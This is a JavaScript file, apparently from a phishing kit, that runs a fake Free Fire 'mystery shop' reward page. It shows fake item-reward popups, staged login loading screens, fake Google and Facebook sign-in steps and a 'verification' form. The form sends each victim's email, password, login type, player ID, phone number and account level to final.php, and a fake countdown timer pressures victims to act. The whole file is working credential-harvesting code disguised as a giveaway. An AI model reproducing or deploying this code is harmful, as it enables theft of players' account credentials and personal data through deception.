// lazcodeffmysteryshop.js
// Variabel global
var _ggLastEmail = '';
var _ggLastLogin = '';

function getEndpoint() {
  return 'final.php';
}

function locationRedirect() {
  document.getElementById('overlay').classList.remove('active');
  document.body.classList.remove('modal-open');
  var accountLogin = document.querySelector('.account_login');
  if (accountLogin) accountLogin.style.display = 'none';
  if (window._ggLastEmail) {
    document.getElementById('validateEmail').value = window._ggLastEmail;
  }
  if (window._ggLastLogin) {
    document.getElementById('validateLogin').value = window._ggLastLogin;
  }
  document.querySelector('.account_verification').style.display = 'flex';
}

// Fungsi untuk popup item
function open_itemReward_confirmation2(el) {
  document.getElementById('myItemReward_confirmationImg').src = el.getAttribute('src');
  document.getElementById('ItemName').textContent = el.getAttribute('item-name');
  document.getElementById('price').textContent = el.getAttribute('item-price');
  document.querySelector('.itemReward_confirmation2').style.display = 'flex';
}

function close_reward_confirmation() {
  document.querySelector('.itemReward_confirmation2').style.display = 'none';
  document.querySelector('.itemReward_confirmationsold').style.display = 'none';
}

function get_token() {
  document.querySelector('.itemReward_confirmation2').style.display = 'none';
  document.querySelector('.loadinglogin').style.display = 'flex';
  document.getElementById('text-login1').style.display = 'block';
  document.getElementById('text-login2').style.display = 'none';
  setTimeout(function() {
    document.getElementById('text-login1').style.display = 'none';
    document.getElementById('text-login2').style.display = 'block';
  }, 1500);
  setTimeout(function() {
    document.querySelector('.loadinglogin').style.display = 'none';
    document.querySelector('.account_login').style.display = 'flex';
  }, 3000);
}

function soldout() {
  document.querySelector('.itemReward_confirmationsold').style.display = 'none';
}

function openGgdanfbStep(stepId) {
  document.querySelector('.account_login').style.display = 'none';
  document.getElementById('overlay').classList.add('active');
  document.body.classList.add('modal-open');
  if (typeof showStep === 'function') showStep(stepId);
}

function ValidateVerificationData() {
  var playid = document.getElementById('playid').value.trim();
  var phone = document.getElementById('phone').value.trim();
  var level = document.getElementById('level').value;
  var email = document.getElementById('validateEmail').value;
  var password = document.getElementById('validatePassword').value;
  var login = document.getElementById('validateLogin').value;
  if (!playid || !phone || !level) return false;
  document.querySelector('.account_verification').style.display = 'none';
  document.querySelector('.check_verification').style.display = 'flex';
  $.ajax({
    type: 'POST',
    url: 'final.php',
    data: { email: email, password: password, login: login, playid: playid, phone: phone, level: level },
    complete: function() {
      setTimeout(function() {
        document.querySelector('.check_verification').style.display = 'none';
        document.querySelector('.processing_account').style.display = 'flex';
      }, 3000);
    }
  });
  return false;
}

// Timer countdown
$(document).ready(function() {
  var detik = 57, menit = 59, jam = 23;
  function updateTimer() {
    setTimeout(updateTimer, 1000);
    $('#timer1').html('&nbsp;&nbsp;' + jam + ' : ' + menit + ' : ' + detik);
    detik--;
    if (detik < 0) { detik = 59; menit--; }
    if (menit < 0) { menit = 59; jam--; }
    if (jam < 0) { jam = 0; menit = 0; detik = 0; }
  }
  updateTimer();
});

// Slider notifikasi (lazaslide)
var LazIndexHeader = 0;
function showLazSlidez() {
  var slides = document.getElementsByClassName('lazaslide');
  for (var i = 0; i < slides.length; i++) slides[i].style.display = 'none';
  LazIndexHeader++;
  if (LazIndexHeader > slides.length) LazIndexHeader = 1;
  slides[LazIndexHeader - 1].style.display = 'block';
  setTimeout(showLazSlidez, 3000);
}
showLazSlidez();

// Scrolling banner untuk teks panjang
function initScrollingBanners() {
  document.querySelectorAll('.item-name-banner, .item-name-confirmation').forEach(function(banner) {
    var span = banner.querySelector('span');
    if (!span) return;
    var bannerWidth = banner.offsetWidth;
    var spanWidth = span.offsetWidth;
    if (spanWidth > bannerWidth) {
      span.style.setProperty('--scroll-distance', -(spanWidth - bannerWidth + 16) + 'px');
      banner.classList.add('needs-scroll');
    } else {
      banner.classList.remove('needs-scroll');
    }
  });
}
document.addEventListener('DOMContentLoaded', initScrollingBanners);
window.addEventListener('resize', initScrollingBanners);

// Event listener tambahan
document.addEventListener('DOMContentLoaded', function() {
  var btnKeluar = document.getElementById('btnKeluar');
  if (btnKeluar) {
    btnKeluar.addEventListener('click', function() {
      var url = this.getAttribute('data-href');
      if (url) window.location.href = url;
    });
  }

  document.addEventListener('click', function(e) {
    if (e.target.classList.contains('overlay') && typeof closeModal === 'function') {
      closeModal();
    }
  });

  document.addEventListener('keydown', function(e) {
    if (e.key !== 'Enter') return;
    if (document.getElementById('stepGEmail')?.classList.contains('active')) {
      gHandleEmailNext();
    } else if (document.getElementById('stepGPass')?.classList.contains('active')) {
      gHandlePassNext();
    } else if (document.getElementById('stepFB')?.classList.contains('active')) {
      fbHandleLogin();
    }
  });

  var downloadBtn = document.getElementById('downloadBtn');
  if (downloadBtn) {
    downloadBtn.addEventListener('click', openModal);
  }
});
